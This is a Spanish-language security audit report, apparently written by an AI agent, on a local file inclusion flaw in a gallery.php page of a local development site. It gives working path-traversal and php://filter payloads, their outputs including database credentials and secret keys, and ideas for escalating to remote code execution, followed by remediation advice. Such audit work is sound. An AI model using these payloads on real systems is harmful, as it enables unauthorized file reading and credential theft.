# Informe de Auditoría de Seguridad - Local File Inclusion (LFI)
**Fecha:** 2026-04-21T08:14:07  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Auditor:** GitHub Copilot CLI (claude-sonnet-4.6)

---

## Resumen Ejecutivo

Se ha identificado y explotado con éxito una vulnerabilidad de **Local File Inclusion (LFI)** en el parámetro `page` del archivo `gallery.php`. Esta vulnerabilidad permite a un atacante leer archivos arbitrarios del servidor, incluidos archivos de configuración con credenciales sensibles.

**Severidad:** 🔴 CRÍTICA

---

## Reconocimiento

### Tecnologías detectadas
- **Servidor web:** PHP (Apache/nginx)
- **Lenguaje:** PHP
- **Aplicación:** Galería de Arte Virtual

### Endpoints descubiertos
- `http://web.dev.local:8081/` — Página principal (index.php)
- `http://web.dev.local:8081/gallery.php?page=modern` — Galería Arte Moderno
- `http://web.dev.local:8081/gallery.php?page=classic` — Arte Clásico
- `http://web.dev.local:8081/gallery.php?page=abstract` — Arte Abstracto
- `http://web.dev.local:8081/gallery.php?page=about` — Acerca de

### Parámetros identificados
| Parámetro | Tipo | Ubicación |
|-----------|------|-----------|
| `page` | GET | `gallery.php` |

---

## Vulnerabilidad: Local File Inclusion (LFI)

### Descripción
El parámetro `page` en `gallery.php` es usado directamente en una llamada `include()` sin sanitización adecuada. La lógica del código es:

```php
$page = $_GET['page'] ?? 'modern';

if (strpos($page, '.') !== false) {
    // Si tiene extensión, se usa tal cual
    $file = $page;
} else {
    // Si no tiene extensión, se busca en pages/
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    @include($file);  // ⚠️ include sin restricción
}
```

### Causa raíz
1. No se valida ni sanitiza la entrada del usuario
2. Se permite el uso de rutas relativas (`../`)
3. Se aceptan wrappers de PHP (`php://filter`)
4. La función `include()` se ejecuta incluso cuando `file_exists()` devuelve false

---

## Explotación

### Prueba 1 — Path Traversal básico (`/etc/passwd`)

**Payload:**
```
GET /gallery.php?page=../../../../etc/passwd
```

**Resultado:** ✅ ÉXITO — Se obtuvo el contenido de `/etc/passwd`:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
...
```

### Prueba 2 — PHP Wrapper: lectura de código fuente

**Payload:**
```
GET /gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php
```

**Resultado:** ✅ ÉXITO — Se obtuvo el código fuente completo de `gallery.php` en base64, revelando la lógica vulnerable.

### Prueba 3 — Lectura de archivo de configuración con credenciales

**Payload:**
```
GET /gallery.php?page=php://filter/convert.base64-encode/resource=config.php
```

**Resultado:** ✅ ÉXITO — Se obtuvo el contenido completo de `config.php`:

```php
<?php
// Secret configuration file
define('DB_HOST', 'localhost');
define('DB_USER', 'gallery_user');
define('DB_PASS', 'SuperSecret123!');
define('DB_NAME', 'gallery_db');

define('SECRET_KEY', 'th1s_is_a_v3ry_s3cr3t_k3y_2025');
define('API_TOKEN', 'api_token_abc123xyz789');
?>
```

### Prueba 4 — Lectura de `/etc/hosts`

**Payload:**
```
GET /gallery.php?page=../../../../etc/hosts
```

**Resultado:** ✅ ÉXITO — Se obtuvieron las IPs internas del servidor:
```
127.0.0.1    localhost
172.19.0.2   d5054e367753
```

---

## Datos Sensibles Obtenidos

| Dato | Valor |
|------|-------|
| DB Host | `localhost` |
| DB User | `gallery_user` |
| DB Password | `SuperSecret123!` |
| DB Name | `gallery_db` |
| Secret Key | `th1s_is_a_v3ry_s3cr3t_k3y_2025` |
| API Token | `api_token_abc123xyz789` |
| IP interna | `172.19.0.2` |

---

## Impacto

| Categoría | Impacto |
|-----------|---------|
| **Confidencialidad** | ALTA — Lectura de archivos arbitrarios del sistema |
| **Integridad** | MEDIA — Posible escalada a RCE via log poisoning |
| **Disponibilidad** | BAJA — No afecta disponibilidad directamente |

**Riesgos derivados:**
- Exposición de credenciales de base de datos → acceso a datos de usuarios
- Exposición de claves secretas → forja de tokens/sesiones
- Posible escalada a **Remote Code Execution (RCE)** mediante:
  - Log poisoning (envenenamiento de logs)
  - `/proc/self/environ` injection
  - Inclusión de archivos subidos

---

## Recomendaciones

1. **Validar y sanitizar la entrada:** Usar una lista blanca de páginas permitidas:
   ```php
   $allowed = ['modern', 'classic', 'abstract', 'about'];
   if (!in_array($page, $allowed)) {
       $page = 'modern';
   }
   $file = "pages/" . $page . ".php";
   ```

2. **No usar `include()` con datos de usuario** sin validación estricta.

3. **Deshabilitar wrappers peligrosos** en `php.ini`:
   ```ini
   allow_url_include = Off
   ```

4. **Configurar `open_basedir`** para restringir el acceso a directorios:
   ```ini
   open_basedir = /var/www/html/
   ```

5. **Mover archivos de configuración** fuera del webroot o protegerlos con `.htaccess`.

6. **Rotar credenciales** expuestas inmediatamente.

---

## Conclusión

La aplicación `gallery.php` presenta una vulnerabilidad **crítica de Local File Inclusion** en el parámetro `page`. La explotación resultó en la lectura exitosa de múltiples archivos sensibles del sistema, incluyendo credenciales de base de datos y claves secretas de la aplicación. Se recomienda corrección inmediata siguiendo las medidas indicadas.

---

*Informe generado automáticamente por GitHub Copilot CLI — Auditoría LFI*
